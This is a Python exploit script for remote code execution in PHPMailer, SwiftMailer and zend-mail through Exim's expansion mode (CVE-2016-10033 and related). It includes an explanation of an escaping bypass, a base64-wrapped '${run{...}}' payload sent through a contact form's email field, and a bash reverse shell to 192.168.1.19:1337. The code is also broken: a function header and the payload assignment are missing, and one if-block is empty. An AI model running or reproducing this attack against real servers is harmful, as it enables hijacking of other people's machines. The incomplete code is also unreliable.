#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt_ul - https://phackt.com
#
# All credits go to Dawid Golunski (@dawid_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
# 
# N.B: 
# The original author&#039;s method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696 
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create 
# the backdoor. This technique is not facing some payload size issues because the payload 
# was in the email body.
#
# For Exim:
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log 
# expansion variables in order to bypass the PHP mail() escaping may leads to large 
# email addresses payloads. However the comment syntax validateAddress() technique does not 
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it&#039;s patch bypass for PHPMailer < 5.5.20) 
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
# 
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
# 
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum_PHPMailer_PoC_contactform.zip
 
import argparse
import urllib
import urllib2
import base64
 
# Prepare command for Exim expansion mode in order 
    return &#039;${run{${base64d:%s}}}&#039; % base64.b64encode(cmd)
 
# Send Request method
def send_request(req):
    try:
        urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        print "[!] Got HTTP error: [%d] when trying to reach " + req.get_full_url() + " - Check the URL!\n\n" % e.code
        exit(3)
    except urllib2.URLError, err:
        print "[!] Got the &#039;%s&#039; error when trying to reach " + req.get_full_url() + " - Check the URL!\n\n" % err.reason
        exit(4)
 
# Parse input args
parser = argparse.ArgumentParser(prog=&#039;rce_phpmailer_exim4.py&#039;, description=&#039;PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version&#039;)
parser.add_argument(&#039;-url&#039;, dest=&#039;WEBAPP_BASE_URL&#039;, required=True,  help=&#039;WebApp Base Url&#039;)
parser.add_argument(&#039;-cf&#039;,  dest=&#039;CONTACT_SCRIPT&#039;,  required=True,  help=&#039;Contact Form scriptname&#039;)
parser.add_argument(&#039;-ip&#039;,  dest=&#039;ATTACKER_IP&#039;,    required=True,  help=&#039;Attacker IP for reverse shell&#039;)
parser.add_argument(&#039;-p&#039;,   dest=&#039;ATTACKER_PORT&#039;,  required=False, help=&#039;Attackers Port for reverse shell&#039;, default="8888")
parser.add_argument(&#039;--post-action&#039;, dest=&#039;POST_ACTION&#039;,  required=False, help=&#039;Overrides POST "action" field name&#039;,         default="send")
parser.add_argument(&#039;--post-name&#039;,   dest=&#039;POST_NAME&#039;,    required=False, help=&#039;Overrides POST "name of sender" field name&#039;, default="name")
parser.add_argument(&#039;--post-email&#039;,  dest=&#039;POST_EMAIL&#039;,   required=False, help=&#039;Overrides POST "email" field name&#039;,          default="email")
parser.add_argument(&#039;--post-msg&#039;,    dest=&#039;POST_MSG&#039;,     required=False, help=&#039;Overrides POST "message" field name&#039;,        default="msg")
args = parser.parse_args()
 
CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT
 
# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL      = [%s]
CONTACT_SCRIPT       = [%s]
ATTACKER_IP          = [%s]
ATTACKER_PORT        = [%s]
POST_ACTION          = [%s]
POST_NAME            = [%s]
POST_EMAIL           = [%s]
POST_MSG             = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.ATTACKER_IP, args.ATTACKER_PORT, args.POST_ACTION, args.POST_NAME, args.POST_EMAIL, args.POST_MSG)
 
# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"""
print """    SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"""
print """    Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"""
print "\033[0m"
 
try:
    target = int(raw_input(&#039;[?] Select target [1-2]: &#039;))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)
 
if (target>2):
    print "No such target. Exiting\n"
    exit(3)
 
################################
# Payload
################################
cmd = "/bin/bash -c &#039;0<&196;exec 196<>/dev/tcp/192.168.1.19/1337;nohup sh <&196 >&196 2>&196 &&#039;"
 
 
# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
 
################################
# Attack episode
# This step will execute the reverse shell
################################
 
# Form fields
post_fields = {&#039;action&#039;: "%s" % args.POST_ACTION, "%s" % args.POST_NAME: &#039;Jas Fasola&#039;, "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: &#039;Really important message&#039;}
 
# Print relevant information
print "\n[+] Executing command on victim server\n"
print &#039;[!] command: [%s]&#039; % cmd
print &#039;[!] payload: [%s]&#039; % payload
print &#039;[!] post_fields: [%s]\n&#039; % str(post_fields)
 
data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
send_request(req)
 
print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"

